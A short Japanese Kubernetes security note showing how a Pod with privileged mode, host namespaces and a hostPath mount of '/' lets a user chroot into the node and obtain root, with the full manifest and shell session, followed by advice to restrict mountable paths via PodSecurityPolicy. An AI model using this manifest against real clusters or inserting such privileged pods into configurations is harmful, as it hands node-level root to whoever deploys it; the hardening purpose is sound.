# ホストパスのマウント

Pod からホストのパスをボリュームとしてマウントすることが可能です。例えば次のような Pod を作成すると `/host` 配下に Pod が配置された node のルートディレクトリをマウントできます。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "tail", "-f", "/dev/null" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

```shell
$ kubectl exec -it noderootpod sh
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
/ # cd /host
/host # chroot .
root@lab-k8s-node-01:/#
root@lab-k8s-node-01:/# id
uid=0(root) gid=0(root) groups=0(root),10(uucp)
```

Pod の作成権限があるアカウント権限を攻撃者に奪われた場合に、権限昇格を行う方法としてこの手法が利用されることが考えられます。そのため、権限昇格を防ぐという目的で PodSecurityPolicy 等でマウント可能なディレクトリを明示的に定義すると良いでしょう。
